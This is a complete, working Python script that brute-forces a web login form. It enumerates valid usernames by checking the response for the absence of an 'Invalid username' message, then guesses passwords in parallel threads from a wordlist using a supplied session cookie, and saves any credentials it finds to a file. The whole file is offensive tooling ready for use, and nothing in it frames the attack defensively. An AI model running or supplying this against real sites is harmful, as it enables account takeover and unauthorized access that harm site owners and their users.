#!/usr/bin/env python3

import requests
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import argparse
import logging
import time
import sys


def setup_logger(verbose):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )


def fetch_items(filename):
    try:
        with open(filename, 'r') as fd:
            return [line.strip() for line in fd if line.strip()]
    except FileNotFoundError:
        logging.error(f"File '{filename}' not found.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Error reading file: {e}")
        sys.exit(1)


def check_server_availability(url, cookie, retries=3):
    for attempt in range(retries):
        try:
            response = requests.get(url, cookies=cookie, timeout=5)
            if response.status_code == 200:
                logging.info("Server is reachable.")
                return True
            else:
                logging.warning(f"Server returned status code: {response.status_code}. Retrying...")
        except requests.RequestException as e:
            logging.warning(f"Server is unreachable: {e}. Retrying...")
        time.sleep(2 ** attempt)  # Exponential backoff
    logging.error("Server is unreachable after retries. Exiting.")
    return False


def task_worker(queue, task_func, *args):
    while not queue.empty():
        item = queue.get()
        try:
            task_func(item, *args)
        except Exception as e:
            logging.error(f"Error processing item {item}: {e}")
        finally:
            queue.task_done()


def check_username(username, url, cookie, result_queue):
    login_data = {'username': username, 'password': 'anything'}
    response = requests.post(url, cookies=cookie, data=login_data, timeout=10)
    if 'Invalid username' not in response.text:
        logging.info(f"Valid username found: {username}")
        result_queue.put(username)


def check_password(password, url, cookie, username, result_queue):
    login_data = {'username': username, 'password': password}
    response = requests.post(url, cookies=cookie, data=login_data, timeout=10)
    if 'Incorrect password' not in response.text:
        logging.info(f"Valid credentials found: {username}:{password}")
        result_queue.put((username, password))


def process_tasks(items, threads, task_func, *args):
    task_queue = Queue()
    for item in items:
        task_queue.put(item)

    with ThreadPoolExecutor(threads) as executor:
        for _ in range(threads):
            executor.submit(task_worker, task_queue, task_func, *args)

    task_queue.join()


def main():
    parser = argparse.ArgumentParser(description="Brute-force a login form.")
    parser.add_argument('--url', required=True, help="Target URL")
    parser.add_argument('--cookie', required=True, help="Session cookie")
    parser.add_argument('--userlist', help="File containing usernames")
    parser.add_argument('--passlist', help="File containing passwords")
    parser.add_argument('--mode', choices=['username', 'password', 'both'], default='username', help="Brute-force mode")
    parser.add_argument('--threads', type=int, default=10, help="Number of concurrent threads")
    parser.add_argument('--verbose', action='store_true', help="Enable verbose output")
    args = parser.parse_args()

    setup_logger(args.verbose)

    if args.mode in ['username', 'both'] and not args.userlist:
        logging.error("--userlist is required for username brute-forcing.")
        sys.exit(1)
    if args.mode in ['password', 'both'] and not args.passlist:
        logging.error("--passlist is required for password brute-forcing.")
        sys.exit(1)

    usernames = fetch_items(args.userlist) if args.userlist else ['static_user']
    passwords = fetch_items(args.passlist) if args.passlist else ['static_pass']

    if not check_server_availability(args.url, {'session': args.cookie}):
        sys.exit(1)

    valid_usernames = []
    if args.mode in ['username', 'both']:
        username_result_queue = Queue()
        process_tasks(usernames, args.threads, check_username, args.url, {'session': args.cookie}, username_result_queue)
        valid_usernames = list(username_result_queue.queue)

    if args.mode in ['password', 'both']:
        if args.mode == 'password':
            valid_usernames = ['static_user']  # Default for password mode
        password_result_queue = Queue()
        for username in valid_usernames:
            process_tasks(passwords, args.threads, check_password, args.url, {'session': args.cookie}, username, password_result_queue)

        # Save credentials
        with open("valid_credentials.txt", "w") as result_file:
            while not password_result_queue.empty():
                username, password = password_result_queue.get()
                result_file.write(f"{username}:{password}\n")

    logging.info("All tasks completed.")


if __name__ == '__main__':
    main()
